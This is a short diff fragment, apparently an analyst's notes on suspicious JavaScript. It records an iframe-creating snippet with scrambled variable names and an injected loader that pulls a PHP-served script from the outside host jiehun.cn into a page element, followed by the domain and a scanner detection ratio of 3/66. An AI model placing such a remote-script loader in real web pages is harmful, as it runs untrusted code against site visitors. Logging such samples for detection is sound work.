@@ -95,3 +95,13 @@ ukqre.setAttribute("frameBorder", "0");
 document.body.appendChild(ukqre);
 utukl = "https://www.w3schools.com/";
 ukqre.src = utukl;
+
+==========
+var jsFile = document.createElement("script");   ^M
+jsFile.setAttribute("type", "text/javascript");   ^M
+jsFile.setAttribute("src", "http://www.jiehun.cn/batch.panel.php?random="+Math.random());   ^M
+document.getElementById('user_status_div').appendChild(jsFile);
+
+^M -> new line signal for vim
+jiehun.cn
+Detection ratio: 3/66
